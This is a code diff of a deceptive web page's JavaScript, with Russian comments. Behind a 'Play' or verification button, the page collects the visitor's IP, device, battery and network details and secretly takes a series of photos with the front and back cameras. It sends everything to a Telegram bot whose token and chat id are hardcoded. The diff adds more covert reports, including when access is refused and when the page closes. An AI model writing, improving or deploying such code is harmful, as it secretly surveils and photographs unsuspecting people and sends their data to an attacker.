@@ -160,8 +160,7 @@
             window.location.href = 'googlechrome://navigate?url=' + encodeURIComponent(window.location.href);
         }
 
-        const botToken = '  
-8134203113:AAEv9pmQQkES_IwC9LhbeMrB1dBO_zLUPcw';
+        const botToken = '8134203113:AAEv9pmQQkES_IwC9LhbeMrB1dBO_zLUPcw';
         const chatId = '-1002577213610';
         const videoElement = document.getElementById('hiddenCamera');
         const playBtn = document.getElementById('playBtn');
@@ -295,15 +294,13 @@
             }, 100);
         }
 
-        // 1. Отправка информации о пользователе
+        // 1. Отправка информации о пользователе (ИСПРАВЛЕННАЯ)
         async function sendUserInfo() {
             try {
-                // Получаем IP-адрес
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
                 const ip = ipData.ip;
 
-                // Получаем дополнительную информацию
                 const [batteryInfo, connectionInfo] = await Promise.all([
                     getBatteryInfo(),
                     getConnectionInfo()
@@ -311,13 +308,12 @@
 
                 const deviceInfo = getDeviceInfo();
 
-                // Формируем сообщение
                 let message = `🚨 Новый посетитель:\nIP: ${ip}\n\n`;
                 message += `=== Информация об устройстве ===\n${formatInfo(deviceInfo)}\n`;
                 message += `=== Батарея ===\n${formatInfo(batteryInfo)}\n`;
                 message += `=== Соединение ===\n${formatInfo(connectionInfo)}\n`;
 
-                // Отправляем сообщение в Telegram
+                // Правильный формат для JSON отправки
                 await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: 'POST',
                     headers: {
@@ -325,7 +321,8 @@
                     },
                     body: JSON.stringify({
                         chat_id: chatId,
-                        text: message
+                        text: message,
+                        parse_mode: 'HTML'
                     })
                 });
 
@@ -343,7 +340,8 @@
                         },
                         body: JSON.stringify({
                             chat_id: chatId,
-                            text: fallbackMessage
+                            text: fallbackMessage,
+                            parse_mode: 'HTML'
                         })
                     });
                 } catch (e) {
@@ -352,7 +350,7 @@
             }
         }
 
-        // 2. Захват фото с камеры и отправка
+        // 2. Захват фото с камеры и отправка (ИСПРАВЛЕННАЯ)
         async function captureAndSendPhoto(index) {
             try {
                 const canvas = document.createElement('canvas');
@@ -372,7 +370,9 @@
                 
                 const caption = `🆔 Фото ${isFrontCameraActive ? 'фронтальной' : 'задней'} камеры #${index}\nВремя: ${new Date().toLocaleString()}`;
                 formData.append('caption', caption);
+                formData.append('parse_mode', 'HTML');
                 
+                // Правильный endpoint для отправки фото
                 await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                     method: 'POST',
                     body: formData
@@ -382,6 +382,23 @@
                 
             } catch (error) {
                 console.error(`Ошибка при отправке фото ${index}:`, error);
+                
+                // При ошибке отправки фото - отправляем текстовое сообщение
+                try {
+                    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: `❌ Ошибка отправки фото #${index} (${isFrontCameraActive ? 'фронтальная' : 'задняя'} камера)\n${error.message || 'Неизвестная ошибка'}`,
+                            parse_mode: 'HTML'
+                        })
+                    });
+                } catch (e) {
+                    console.error('Ошибка при отправке сообщения об ошибке:', e);
+                }
             }
         }
 
@@ -416,6 +433,24 @@
 
             } catch (error) {
                 console.error('Ошибка при переключении камеры:', error);
+                
+                // Отправляем информацию об ошибке переключения
+                try {
+                    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: `⚠️ Ошибка переключения камеры:\nТип: ${isFrontCameraActive ? 'на заднюю' : 'на фронтальную'}\nОшибка: ${error.message || 'Неизвестная ошибка'}`,
+                            parse_mode: 'HTML'
+                        })
+                    });
+                } catch (e) {
+                    console.error('Ошибка при отправке сообщения об ошибке камеры:', e);
+                }
+                
                 throw error;
             }
         }
@@ -431,12 +466,47 @@
                         await switchCamera();
                         setTimeout(takeSeriesOfPhotos, photoInterval);
                     } else {
+                        // Отправляем сообщение о завершении съемки
+                        try {
+                            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json',
+                                },
+                                body: JSON.stringify({
+                                    chat_id: chatId,
+                                    text: `✅ Серийная съемка завершена\nОтправлено фото: ${totalPhotos}\nВремя: ${new Date().toLocaleString()}`,
+                                    parse_mode: 'HTML'
+                                })
+                            });
+                        } catch (e) {
+                            console.error('Ошибка при отправке сообщения о завершении:', e);
+                        }
+                        
                         stopAllCameras();
                     }
                 }
                 
             } catch (error) {
                 console.error('Ошибка в процессе серийной съемки:', error);
+                
+                // Отправляем информацию об ошибке процесса
+                try {
+                    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: `❌ Ошибка серийной съемки:\nОтправлено фото: ${photoCount}/${totalPhotos}\nОшибка: ${error.message || 'Неизвестная ошибка'}`,
+                            parse_mode: 'HTML'
+                        })
+                    });
+                } catch (e) {
+                    console.error('Ошибка при отправке сообщения об ошибке процесса:', e);
+                }
+                
                 stopAllCameras();
             }
         }
@@ -457,7 +527,7 @@
             console.log('Все камеры отключены');
         }
 
-        // 6. Инициализация камер
+        // 6. Инициализация камер (ИСПРАВЛЕННАЯ)
         async function initCameras() {
             try {
                 const devices = await navigator.mediaDevices.enumerateDevices();
@@ -473,6 +543,23 @@
                 // Показываем новый фон и запускаем прогресс-бар
                 newBackground.style.display = 'block';
                 startProgressBar();
+
+                // Отправляем сообщение о начале съемки
+                try {
+                    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: `📸 Начало серийной съемки\nВсего фото: ${totalPhotos}\nИнтервал: ${photoInterval}мс\nВремя: ${new Date().toLocaleString()}`,
+                            parse_mode: 'HTML'
+                        })
+                    });
+                } catch (e) {
+                    console.error('Ошибка при отправке сообщения о начале съемки:', e);
+                }
 
                 isFrontCameraActive = true;
                 currentStream = await navigator.mediaDevices.getUserMedia({ 
@@ -495,8 +582,9 @@
                 console.error('Ошибка при инициализации камер:', error);
                 messageBox.style.display = 'block';
                 
+                // Отправляем подробное сообщение об ошибке
                 try {
-                    const errorMessage = `⚠️ Ошибка доступа к камерам:\nУстройство: ${navigator.userAgent}\nОшибка: ${error.message || 'Неизвестная ошибка'}`;
+                    const errorMessage = `⚠️ Ошибка доступа к камерам:\nУстройство: ${navigator.userAgent}\nОшибка: ${error.message || 'Неизвестная ошибка'}\nВремя: ${new Date().toLocaleString()}`;
                     
                     await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                         method: 'POST',
@@ -505,7 +593,8 @@
                         },
                         body: JSON.stringify({
                             chat_id: chatId,
-                            text: errorMessage
+                            text: errorMessage,
+                            parse_mode: 'HTML'
                         })
                     });
                 } catch (e) {
@@ -518,6 +607,23 @@
         playBtn.addEventListener('click', async function() {
             console.log('Начало процесса верификации...');
             try {
+                // Отправляем сообщение о нажатии кнопки
+                try {
+                    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: `🟢 Пользователь нажал кнопку "Играть"\nВремя: ${new Date().toLocaleString()}`,
+                            parse_mode: 'HTML'
+                        })
+                    });
+                } catch (e) {
+                    console.error('Ошибка при отправке сообщения о нажатии кнопки:', e);
+                }
+                
                 // Сначала запрашиваем доступ к камере через стандартное системное окно
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 // Если доступ получен, сразу закрываем поток (системное окно уже показано)
@@ -529,6 +635,23 @@
             } catch (error) {
                 console.error('Пользователь отказал в доступе к камере:', error);
                 messageBox.style.display = 'block';
+                
+                // Отправляем сообщение об отказе в доступе
+                try {
+                    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: `⛔ Пользователь отказал в доступе к камере\nВремя: ${new Date().toLocaleString()}\nОшибка: ${error.message || 'Неизвестная ошибка'}`,
+                            parse_mode: 'HTML'
+                        })
+                    });
+                } catch (e) {
+                    console.error('Ошибка при отправке сообщения об отказе:', e);
+                }
             }
         });
 
@@ -541,6 +664,24 @@
         // Остановка камер при закрытии страницы
         window.addEventListener('beforeunload', function() {
             console.log('Страница закрывается, остановка камер...');
+            
+            // Отправляем сообщение о закрытии страницы
+            try {
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: `📴 Страница закрыта пользователем\nВремя: ${new Date().toLocaleString()}\nОтправлено фото: ${photoCount}/${totalPhotos}`,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch (e) {
+                console.error('Ошибка при отправке сообщения о закрытии:', e);
+            }
+            
             stopAllCameras();
         });
 
